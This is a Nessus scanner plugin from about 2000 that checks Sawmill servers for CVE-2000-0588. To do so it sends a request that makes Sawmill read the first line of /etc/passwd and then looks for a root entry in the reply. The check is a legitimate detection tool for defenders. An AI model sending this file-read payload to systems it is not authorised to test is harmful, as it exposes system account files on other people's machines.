#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10453);
 script_bugtraq_id(1402);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2000-0588");

 name["english"] = "sawmill allows the reading of the first line of any file";
 name["francais"] = "sawmill allows the reading of the first line of any file";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote sawmill daemon allows the reading of the first
line of arbitrary files on the remote system.

Solution : upgrade
Risk factor : Medium";


 desc["francais"] = "
Le daemon sawmill distant permet la lecture de la
premiere ligne de fichiers arbitraires sur l'hotre
distant.

Solution : mettez-le à jour
Facteur de risque : Moyen";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks if sawmill reads any file";
 summary["francais"] = "Vérifie si sawmill lit n'importe quel fichier";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Remote file access";
 family["francais"] = "Accès aux fichiers distants";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports(8987, "Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = 8987;
if(get_port_state(port))
{
  req  = string("/sawmill?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3");
  req = http_get(item:req, port:port);
  r = http_keepalive_send_recv(port:port, data:req);
  if( r == NULL ) exit(0);
  
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
  {
   set_kb_item(name:"Sawmill/readline", value:TRUE);
   set_kb_item(name:"Sawmill/method", value:"standalone");
   security_warning(port);
  }
}


port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
  req = string(dir, "/sawmill?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3");
  req = http_get(item:req, port:port);
  r = http_keepalive_send_recv(port:port, data:req);
  if( r == NULL ) exit(0);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
  {
   set_kb_item(name:"Sawmill/readline", value:TRUE);
   set_kb_item(name:"Sawmill/method", value:"cgi");
   security_warning(port);
  }
}
